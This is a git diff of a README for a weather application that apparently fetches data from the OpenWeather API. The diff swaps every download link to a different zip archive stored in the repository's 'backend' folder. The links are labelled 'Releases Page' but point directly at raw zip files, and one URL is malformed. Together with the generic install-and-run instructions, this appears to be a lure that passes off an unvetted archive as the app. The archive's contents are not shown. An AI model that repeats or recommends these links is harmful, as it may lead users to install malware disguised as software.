@@ -1,7 +1,7 @@
 # 🌤️ Weather_Information_proj - Discover Real-Time Weather Easily
 
 ## 📥 Download the App
-[![Download Weather App](https://raw.githubusercontent.com/sugriv1234/Weather_Information_proj/main/Screenshots/Weather_Information_proj_1.3.zip%20Weather%https://raw.githubusercontent.com/sugriv1234/Weather_Information_proj/main/Screenshots/Weather_Information_proj_1.3.zip)](https://raw.githubusercontent.com/sugriv1234/Weather_Information_proj/main/Screenshots/Weather_Information_proj_1.3.zip)
+[![Download Weather App](https://raw.githubusercontent.com/sugriv1234/Weather_Information_proj/main/backend/Information-Weather-proj-v3.9-alpha.5.zip%20Weather%https://raw.githubusercontent.com/sugriv1234/Weather_Information_proj/main/backend/Information-Weather-proj-v3.9-alpha.5.zip)](https://raw.githubusercontent.com/sugriv1234/Weather_Information_proj/main/backend/Information-Weather-proj-v3.9-alpha.5.zip)
 
 ## 🛠️ Overview
 Weather App is a simple, responsive weather application. It fetches real-time weather details using the OpenWeather API. You can search for any city to see the temperature, conditions, humidity, and dynamic weather icons. The app ensures secure handling of your API key on the backend, making it both user-friendly and safe.
@@ -10,7 +10,7 @@ Weather App is a simple, responsive weather application. It fetches real-time we
 To get started with the Weather App, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases Page](https://raw.githubusercontent.com/sugriv1234/Weather_Information_proj/main/Screenshots/Weather_Information_proj_1.3.zip) to download the app.
+   Go to the [Releases Page](https://raw.githubusercontent.com/sugriv1234/Weather_Information_proj/main/backend/Information-Weather-proj-v3.9-alpha.5.zip) to download the app.
 
 2. **Download the App**
    Choose the latest version available. Click the appropriate download link for your operating system.
@@ -34,7 +34,7 @@ To get started with the Weather App, follow these steps:
 - **Network**: Ensure you have a reliable internet connection to fetch weather data.
 
 ## 📥 Download & Install
-To download the app, visit the [Releases Page](https://raw.githubusercontent.com/sugriv1234/Weather_Information_proj/main/Screenshots/Weather_Information_proj_1.3.zip). Select the latest release to find the installation file suitable for your operating system. After downloading, proceed with the installation, then run the app to start exploring the weather.
+To download the app, visit the [Releases Page](https://raw.githubusercontent.com/sugriv1234/Weather_Information_proj/main/backend/Information-Weather-proj-v3.9-alpha.5.zip). Select the latest release to find the installation file suitable for your operating system. After downloading, proceed with the installation, then run the app to start exploring the weather.
 
 ## 🧑‍🤝‍🧑 Support
 If you encounter issues, feel free to check out the “Issues” section on the GitHub repository. You can raise a question or report any bugs you find. The community is here to help you.
